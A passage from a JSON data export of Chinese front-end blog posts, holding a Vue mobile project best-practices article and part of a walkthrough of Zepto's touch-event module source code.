\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(val\u0026lt;=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e){\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e+binarySuffixes[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(power=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;power\u0026lt;binarySuffixes.length;power++){\n       min = \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.pow(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e,power)\n       max = \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.pow(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e,power+\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n       \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(val\u0026gt;=min \u0026amp;\u0026amp; val\u0026lt;= max){\n         suffix = binarySuffixes[power]\n         val = val/min\n         \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e\n       }\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e val.toFixed(fixed)+suffix\n\n  }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ethrow\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eError\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'value should be a number!'\u003c/span\u003e)\n  }\n}\u003c/code\u003e\u003c/pre\u003e\u003col\u003e\n\u003cli\u003e未完待续...\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1514958808.853","__v":0}
{"_id":{"$oid":"5a4e188ee4919b0e782b4c85"},"id":"58f56940ac502e006c3ec2e6","author":{"$oid":"5a4e188de4919b0e782b4c82"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/4/18/d7743524a8bb4d029a6e2f56ef450310.jpg"],"screenShot":"https://dn-mhke0kuv.qbox.me/1be91267dfbbcedddce5.jpg"}],"title":"Vue 小项目的最佳实践 ","meta":{"likeCount":0},"tag":["Vue.js","微信","Vuex","axios"],"comment":[],"shortContent":"项目简介 目前一期只是为App内某个模块资讯模块文章的分享和APP下载，后续还会有更多的功能,为了项目可扩展、可伸缩结合了我以前的实践搭建了此项目项目地址,如果这个简单的项目能给您带来帮助请给小哥哥⭐Star好不好（手动笔芯）。 功能 根据分享出来的文章ID获取数据 在网页内可…","content":"\u003ch2 id=\"-\"\u003e项目简介\u003c/h2\u003e\n\u003cp\u003e 目前一期只是为App内某个模块资讯模块文章的分享和APP下载，后续还会有更多的功能,为了项目可扩展、可伸缩结合了我以前的实践搭建了此项目\u003ca href=\"https://github.com/HopeFE/Ant_App_H5\" target=\"_blank\"\u003e项目地址\u003c/a\u003e,如果这个简单的项目能给您带来帮助请给小哥哥⭐Star好不好（手动笔芯）。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e功能\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e根据分享出来的文章ID获取数据\u003c/li\u003e\n\u003cli\u003e在网页内可以打开或者下载该APP\u003c/li\u003e\n\u003cli\u003e微信平台的特殊处理\u003cul\u003e\n\u003cli\u003e微信平台的屏蔽了scheme,文章页面的打开APP的功能需要出浮窗提示去浏览器中打开\u003c/li\u003e\n\u003cli\u003e下载APP页面在微信中，IOS可以唤起APP Store,安卓则需要提示浮窗\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"-\"\u003e使用技术须知\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eVue\u003c/code\u003e,\u003ccode\u003eVueRouter\u003c/code\u003e,\u003ccode\u003eVuex\u003c/code\u003e三件套不在多说\u003c/p\u003e\n\u003ch3 id=\"axios\"\u003eAxios\u003c/h3\u003e\n\u003cp\u003e主要用来发起Http请求，想要详细了解具体使用方式和操作指南可以请参考下面的几篇文章\u003cbr\u003e\u003ca href=\"https://ykloveyxk.github.io/2017/02/25/axios%E5%85%A8%E6%94%BB%E7%95%A5/\" target=\"_blank\"\u003eAxios全攻略\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://blog.ygxdxx.com/2017/02/01/Vuex2\u0026amp;Axios-Develop/\" target=\"_blank\"\u003eVuex2和Axios的开发\u003c/a\u003e\u003cbr\u003e注意：因为\u003ccode\u003eAxios\u003c/code\u003e使用了\u003ccode\u003ePromise\u003c/code\u003e,适配低版本浏览器 一定要配合使用\u003ccode\u003ees6-promise\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"vuex-router-sync\"\u003eVuex-router-sync\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/vuejs/vuex-router-sync\" target=\"_blank\"\u003eVuex-router-sync资料\u003c/a\u003e\u003cbr\u003e功能：将Router中的 这些数据注入到Store中，方便我们调用。\u003cbr\u003e在此项目中 我用此插件获取URL上的文章ID\u003c/p\u003e\n\u003ch3 id=\"vue-meta\"\u003eVue-meta\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/declandewet/vue-meta.org/zh-cn/index.html\" target=\"_blank\"\u003eVue-meta资料\u003c/a\u003e\u003cbr\u003e功能：改变网页Head上的一些标签值。\u003cbr\u003e在此项目中，我用此插件改变文章页面上的Title，在浏览器中标题不那么木讷。\u003c/p\u003e\n\u003ch3 id=\"mobi-css\"\u003eMobi.css\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"http://v1.getmobicss.com/zh-cn/docs/\" target=\"_blank\"\u003eMobi.css资料\u003c/a\u003e\u003cbr\u003e功能：小而精美的手机端CSS布局库\u003cbr\u003e在此项目中，不想用太大的UI框架也不想自己写太多的样式，选择了它。\u003c/p\u003e\n\u003ch3 id=\"vue-infinite-loading\"\u003eVue-infinite-loading\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://peachscript.github.io/vue-infinite-loading\" target=\"_blank\"\u003eVue-infinite-loading资料\u003c/a\u003e\u003cbr\u003e功能：缓解加载数据时页面空白的尴尬，可自定义loading动画。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e关键实现\u003c/h2\u003e\n\u003ch3 id=\"url-id\"\u003eURL上获取文章ID\u003c/h3\u003e\n\u003cp\u003e和APP的同学商量了我们就用\u003ca href=\"http://xxxx/article/:id的方式去定义分享出去文章地址，页面通过获得URL上的\" target=\"_blank\"\u003ehttp://xxxx/article/:id的方式去定义分享出去文章地址，页面通过获得URL上的\u003c/a\u003e\u003cbr\u003eID去请求相对应的数据。我是使用\u003ccode\u003eVuex-router-sync\u003c/code\u003e直接从Store中获得ID的\u003ccode\u003erootState.route.params.id\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 文件src/modules/action\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e/** 获取文章信息 */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e getArticle = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003e{ rootState, commit }\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    axios({\n      \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'get'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'share/news_details'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eparams\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003enews_id\u003c/span\u003e: rootState.route.params.id\n      }\n    })\n    .then(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      commit(types.ARTICLE, response.data.data)\n      resolve(response)\n    })\n    .catch(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      reject(error)\n    })\n  })\n}\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"store-\"\u003eStore中获取环境区别\u003c/h3\u003e\n\u003cp\u003e在每个页面进行操作时，我们需要鉴别当前系统是IOS或者安卓，每次通过正则去鉴别UA里的字符串太麻烦，所以我将此放到Store中，方便所有的组件使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 文件src/modules/store\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e state = {\n  \u003cspan class=\"hljs-attr\"\u003esystem\u003c/span\u003e: (\u003cspan class=\"hljs-regexp\"\u003e/iphone|ipad|ipod/\u003c/span\u003e.test(navigator.userAgent.toLowerCase()) ? \u003cspan class=\"hljs-string\"\u003e'IOS'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'Android'\u003c/span\u003e),\n  \u003cspan class=\"hljs-attr\"\u003earticle\u003c/span\u003e: {},\n  \u003cspan class=\"hljs-attr\"\u003eisWeixin\u003c/span\u003e: (\u003cspan class=\"hljs-regexp\"\u003e/MicroMessenger/ig\u003c/span\u003e).test(navigator.userAgent)\n}\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e合理的处置异常\u003c/h3\u003e\n\u003cp\u003e我们去加载数据时可能会遇到失败的情况，这里需要对页面有一个良好的处理，这里我主要使用\u003ccode\u003eVue-infinite-loading\u003c/code\u003e去实现页面上的效果。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e_onInfinite () {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.getArticle().then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-comment\"\u003e// 完成之后loading消失 \u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$refs.infiniteLoading.$emit(\u003cspan class=\"hljs-string\"\u003e'$InfiniteLoading:loaded'\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$refs.infiniteLoading.$emit(\u003cspan class=\"hljs-string\"\u003e'$InfiniteLoading:complete'\u003c/span\u003e)\n  })\n  .catch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-comment\"\u003e// 异常之后页面的展示  执行下方slot=\"no-results\"部分\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$refs.infiniteLoading.$emit(\u003cspan class=\"hljs-string\"\u003e'$InfiniteLoading:complete'\u003c/span\u003e)\n  })\n}\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u0026lt;infinite-loading :on-infinite=\u003cspan class=\"hljs-string\"\u003e\"_onInfinite\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"infiniteLoading\"\u003c/span\u003e spinner=\u003cspan class=\"hljs-string\"\u003e\"bubbles\"\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eslot\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"no-results\"\u003c/span\u003e\u0026gt;\u003c/span\u003e好像来到了奇怪的地方~\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;span slot=\u003cspan class=\"hljs-string\"\u003e\"no-more\"\u003c/span\u003e\u0026gt;\u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003espan\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\n\u0026lt;\u003cspan class=\"hljs-regexp\"\u003e/infinite-loading\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"keep-alive-\"\u003ekeep-alive组件复用\u003c/h3\u003e\n\u003cp\u003e这是一个很能提高页面性能的标签，会将已使用过的不活动的组件缓存起来而不是销毁。在性能不太好的手机上，模版的渲染也是需要一定时间的，我们可以用这个标签将缓存曾经使用过的组件（页面），在此组件激活时刷新里面的数据即可。激活时使用\u003ca href=\"https://vuefe.cn/v2/api/#activated\" target=\"_blank\"\u003eactivated\u003c/a\u003e这个生命周期\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/4/18/d7743524a8bb4d029a6e2f56ef450310.jpg\" atr=\"activated\"/\u003e\u003cfigcaption\u003eactivated\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e  activated () {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.clearArticle() \u003cspan class=\"hljs-comment\"\u003e//激活时先清除Store中的数据 因为$InfiniteLoading是根据页面高度来发起请求的\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$refs.infiniteLoading.$emit(\u003cspan class=\"hljs-string\"\u003e'$InfiniteLoading:reset'\u003c/span\u003e)\n  }\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e组件代码的规范\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e始终基于模块的方式来构建你的 app，每一个子模块只做一件事情。\u003cbr\u003eVue.js 的设计初衷就是帮助开发者更好的开发界面模块。一个模块是应用程序中独立的一个部分。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们需要将我们\u003ccode\u003e*.vue\u003c/code\u003e文件按照一定的结构组织，使得组件便于理解，主要有以下几点比较重要：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e导出一个清晰、组织有序的组件，使得代码易于阅读和理解。同时也便于标准化。\u003c/li\u003e\n\u003cli\u003e按首字母排序属性，data, computed, watches 和 methods 使得属性便于查找。\u003c/li\u003e\n\u003cli\u003e合理组织，使得组件易于阅读。(name; extends; props, data and computed; components; watch and methods; lifecycle methods, 等.);\u003c/li\u003e\n\u003cli\u003e使用 name 属性。借助于vue devtools可以让你更方便的测试\u003c/li\u003e\n\u003cli\u003e合理的 CSS 结构，如 BEM 或 rscss - 详情?;\u003c/li\u003e\n\u003cli\u003e使用单文件 .vue 文件格式来组件代码\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e同时配合\u003ccode\u003eESLint\u003c/code\u003e将代码写的更加规范和阅读，我这边使用\u003ccode\u003eStandard\u003c/code\u003e的风格，在VScode中也开启了Standard的验证。\u003cbr\u003e\u003ca href=\"http://eslint.org/\" target=\"_blank\"\u003eESLint官网\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/feross/standard/blob/master/docs/README-zhcn.md\" target=\"_blank\"\u003eJavaScript 代码规范-Standard风格\u003c/a\u003e\u003cbr\u003e组件规范也可以参考笔者这篇：\u003ca href=\"https://blog.ygxdxx.com/2017/03/09/Vuejs-Component-Style-Guide/\" target=\"_blank\"\u003eVue.js 组件编码规范\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e最后\u003c/h2\u003e\n\u003cp\u003e看起来此项目简单，实则上用了不少插件去实现需要较强的动手（第三方坑也多，选择一个好的插件得先去github上看看，作者的代码质量），需要保持一定的弹性方便日后的扩展也要避免过度的设计。大家若想要加速自己的开发速度，可以多逛逛\u003ca href=\"https://github.com/vuejs/awesome-vue#libraries--plugins\" target=\"_blank\"\u003eVue awesome\u003c/a\u003e上看看大多数都是高质量的插件，其实很多轮子都有人造好了，选取好的直接拿来用岂不妙哉？\u003c/p\u003e\n","buildTime":"1515052049.7532","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c7e"},"id":"59c1a9d76fb9a00a554f9ba2","author":{"$oid":"5a4b76338b69bb25d83da3d3"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/5/30/76626b0be42083d36b36f4a117dc1873"],"screenShot":null}],"title":"读Zepto源码之Touch模块","meta":{"likeCount":0},"tag":["Zepto.js","源码","前端","GitHub"],"comment":[],"shortContent":"大家都知道，因为历史原因，移动端上的点击事件会有 300ms 左右的延迟，Zepto 的 touch 模块解决的就是移动端点击延迟的问题，同时也提供了滑动的 swipe 事件。 并且为每个事件都注册了快捷方法。 返回的是滑动的方法。 x1 为 x轴 起点坐标， x2 为 x轴 …","content":"\u003cp\u003e大家都知道，因为历史原因，移动端上的点击事件会有 \u003ccode\u003e300ms\u003c/code\u003e 左右的延迟，\u003ccode\u003eZepto\u003c/code\u003e 的 \u003ccode\u003etouch\u003c/code\u003e 模块解决的就是移动端点击延迟的问题，同时也提供了滑动的 \u003ccode\u003eswipe\u003c/code\u003e 事件。\u003c/p\u003e\n\u003cp\u003e读 Zepto 源码系列文章已经放到了github上，欢迎star: \u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto\" target=\"_blank\"\u003ereading-zepto\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e源码版本\u003c/h2\u003e\n\u003cp\u003e本文阅读的源码为 \u003ca href=\"https://github.com/madrobby/zepto/tree/v1.2.0\" target=\"_blank\"\u003ezepto1.2.0\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"gitbook\"\u003eGitBook\u003c/h2\u003e\n\u003cp\u003e《\u003ca href=\"https://yeyuqiudeng.gitbooks.io/reading-zepto/content/\" target=\"_blank\"\u003ereading-zepto\u003c/a\u003e》\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e实现的事件\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e;[\u003cspan class=\"hljs-string\"\u003e'swipe'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'swipeLeft'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'swipeRight'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'swipeUp'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'swipeDown'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'doubleTap'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'tap'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'singleTap'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'longTap'\u003c/span\u003e].forEach(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eeventName\u003c/span\u003e)\u003c/span\u003e{\n  $.fn[eventName] = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecallback\u003c/span\u003e)\u003c/span\u003e{ \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.on(eventName, callback) }\n})\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e从上面的代码中可以看到，\u003ccode\u003eZepto\u003c/code\u003e 实现了以下的事件：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eswipe: 滑动事件\u003c/li\u003e\n\u003cli\u003eswipeLeft: 向左滑动事件\u003c/li\u003e\n\u003cli\u003eswipeRight: 向右滑动事件\u003c/li\u003e\n\u003cli\u003eswipeUp: 向上滑动事件\u003c/li\u003e\n\u003cli\u003eswipeDown: 向下滑动事件\u003c/li\u003e\n\u003cli\u003edoubleTap: 屏幕双击事件\u003c/li\u003e\n\u003cli\u003etap: 屏幕点击事件，比 \u003ccode\u003eclick\u003c/code\u003e 事件响应更快\u003c/li\u003e\n\u003cli\u003esingleTap: 屏幕单击事件\u003c/li\u003e\n\u003cli\u003elongTap: 长按事件\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e并且为每个事件都注册了快捷方法。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e内部方法\u003c/h2\u003e\n\u003ch3 id=\"swipedirection\"\u003eswipeDirection\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eswipeDirection\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ex1, x2, y1, y2\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(x1 - x2) \u0026gt;=\n    \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.abs(y1 - y2) ? (x1 - x2 \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'Left'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'Right'\u003c/span\u003e) : (y1 - y2 \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e'Up'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'Down'\u003c/span\u003e)\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e返回的是滑动的方法。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ex1\u003c/code\u003e 为 \u003ccode\u003ex轴\u003c/code\u003e 起点坐标， \u003ccode\u003ex2\u003c/code\u003e 为 \u003ccode\u003ex轴\u003c/code\u003e 终点坐标， \u003ccode\u003ey1\u003c/code\u003e 为 \u003ccode\u003ey轴\u003c/code\u003e 起点坐标， \u003ccode\u003ey2\u003c/code\u003e 为 \u003ccode\u003ey轴\u003c/code\u003e 终点坐标。\u003c/p\u003e\n\u003cp\u003e这里有多组三元表达式，首先对比的是 \u003ccode\u003ex轴\u003c/code\u003e 和 \u003ccode\u003ey轴\u003c/code\u003e 上的滑动距离，如果 \u003ccode\u003ex轴\u003c/code\u003e 的滑动距离比 \u003ccode\u003ey轴\u003c/code\u003e 大，则为左右滑动，否则为上下滑动。\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003ex轴\u003c/code\u003e 上，如果起点位置比终点位置大，则为向左滑动，返回 \u003ccode\u003eLeft\u003c/code\u003e ，否则为向右滑动，返回 \u003ccode\u003eRight\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003ey轴\u003c/code\u003e 上，如果起点位置比终点位置大，则为向上滑动，返回 \u003ccode\u003eUp\u003c/code\u003e ，否则为向下滑动，返回 \u003ccode\u003eDown\u003c/code\u003e 。\u003c/p\u003e\n\u003ch3 id=\"longtap\"\u003elongTap\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e touch = {},\n    touchTimeout, tapTimeout, swipeTimeout, longTapTimeout,\n    longTapDelay = \u003cspan class=\"hljs-number\"\u003e750\u003c/span\u003e,\n    gesture\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003elongTap\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  longTapTimeout = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touch.last) {\n    touch.el.trigger(\u003cspan class=\"hljs-string\"\u003e'longTap'\u003c/span\u003e)\n    touch = {}\n  }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e触发长按事件。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etouch\u003c/code\u003e 对象保存的是触摸过程中的信息。\u003c/p\u003e\n\u003cp\u003e在触发 \u003ccode\u003elongTap\u003c/code\u003e 事件前，先将保存定时器的变量 \u003ccode\u003elongTapTimeout\u003c/code\u003e 释放，如果 \u003ccode\u003etouch\u003c/code\u003e 对象中存在 \u003ccode\u003elast\u003c/code\u003e ，则触发 \u003ccode\u003elongTap\u003c/code\u003e 事件， \u003ccode\u003elast\u003c/code\u003e 保存的是最后触摸的时间。最后将 \u003ccode\u003etouch\u003c/code\u003e 重置为空对象，以便下一次使用。\u003c/p\u003e\n\u003ch3 id=\"cancellongtap\"\u003ecancelLongTap\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecancelLongTap\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (longTapTimeout) clearTimeout(longTapTimeout)\n  longTapTimeout = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e撤销 \u003ccode\u003elongTap\u003c/code\u003e 事件的触发。\u003c/p\u003e\n\u003cp\u003e如果有触发 \u003ccode\u003elongTap\u003c/code\u003e 的定时器，清除定时器即可阻止 \u003ccode\u003elongTap\u003c/code\u003e 事件的触发。\u003c/p\u003e\n\u003cp\u003e最后同样需要将 \u003ccode\u003elongTapTimeout\u003c/code\u003e 变量置为 \u003ccode\u003enull\u003c/code\u003e ，等待垃圾回收。\u003c/p\u003e\n\u003ch3 id=\"cancelall\"\u003ecancelAll\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecancelAll\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (touchTimeout) clearTimeout(touchTimeout)\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (tapTimeout) clearTimeout(tapTimeout)\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (swipeTimeout) clearTimeout(swipeTimeout)\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (longTapTimeout) clearTimeout(longTapTimeout)\n  touchTimeout = tapTimeout = swipeTimeout = longTapTimeout = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n  touch = {}\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e清除所有事件的执行。\u003c/p\u003e\n\u003cp\u003e其实就是清除所有相关的定时器，最后将 \u003ccode\u003etouch\u003c/code\u003e 对象设置为 \u003ccode\u003enull\u003c/code\u003e 。\u003c/p\u003e\n\u003ch3 id=\"isprimarytouch\"\u003eisPrimaryTouch\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eisPrimaryTouch\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (event.pointerType == \u003cspan class=\"hljs-string\"\u003e'touch'\u003c/span\u003e ||\n          event.pointerType == event.MSPOINTER_TYPE_TOUCH)\n  \u0026amp;\u0026amp; event.isPrimary\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e是否为主触点。\u003c/p\u003e\n\u003cp\u003e当 \u003ccode\u003epointerType\u003c/code\u003e 为 \u003ccode\u003etouch\u003c/code\u003e 并且 \u003ccode\u003eisPrimary\u003c/code\u003e 为 \u003ccode\u003etrue\u003c/code\u003e 时，才为主触点。 \u003ccode\u003epointerType\u003c/code\u003e 可为 \u003ccode\u003etouch\u003c/code\u003e 、 \u003ccode\u003epen\u003c/code\u003e 和 \u003ccode\u003emouse\u003c/code\u003e ，这里只处理手指触摸的情况。\u003c/p\u003e\n\u003ch3 id=\"ispointereventtype\"\u003eisPointerEventType\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eisPointerEventType\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee, type\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan 